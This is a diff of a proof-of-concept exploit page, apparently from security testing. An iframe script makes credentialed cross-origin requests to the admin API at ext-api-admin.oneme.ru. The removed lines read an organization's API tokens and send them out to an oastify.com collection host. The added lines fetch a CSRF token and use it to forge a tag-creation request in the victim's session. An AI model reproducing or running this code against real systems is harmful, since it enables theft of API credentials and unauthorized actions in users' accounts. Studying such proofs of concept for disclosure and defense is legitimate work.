@@ -1,10 +1,40 @@
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+var csrfReq = new XMLHttpRequest();
+csrfReq.open('POST', 'https://ext-api-admin.oneme.ru/v1/csrf/refresh', true);
+csrfReq.withCredentials = true;
+
+csrfReq.onload = function () {
+    if (csrfReq.status < 200 || csrfReq.status >= 300) {
+        console.error('Ошибка получения CSRF-токена:', csrfReq.status);
+        return;
+    }
+
+    var csrfToken;
+    try {
+        csrfToken = JSON.parse(csrfReq.responseText).csrf_token;
+        if (typeof csrfToken !== 'string' || !csrfToken) {
+            throw new Error('В ответе отсутствует csrf_token');
+        }
+    } catch (error) {
+        console.error('Некорректный ответ сервера:', error);
+        return;
+    }
+
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get','https://ext-api-admin.oneme.ru/v1/organizations/tokens/a2d6fb84-5a33-4167-895f-87a065a74040',true);
-    req.withCredentials = true;
-    req.send();
-    function reqListener() {
-        location='https://rxs01ardwok50hrafzqqz21is9y0mvak.oastify.com/log?key='+encodeURIComponent(this.responseText);
+    req.onerror = function () {
+        console.error('Сетевая ошибка при создании тега');
     };
+    req.open('POST', 'https://ext-api-admin.oneme.ru/v1/tag/create', true);
+    req.withCredentials = true;
+    req.setRequestHeader('Content-Type', 'application/json');
+    req.setRequestHeader('X-Csrf-Token', csrfToken);
+    req.send(JSON.stringify({ text: 'testik', color: 'orange' }));
+};
+
+csrfReq.onerror = function () {
+    console.error('Сетевая ошибка при получении CSRF-токена');
+};
+
+csrfReq.send();
 </script>"></iframe>
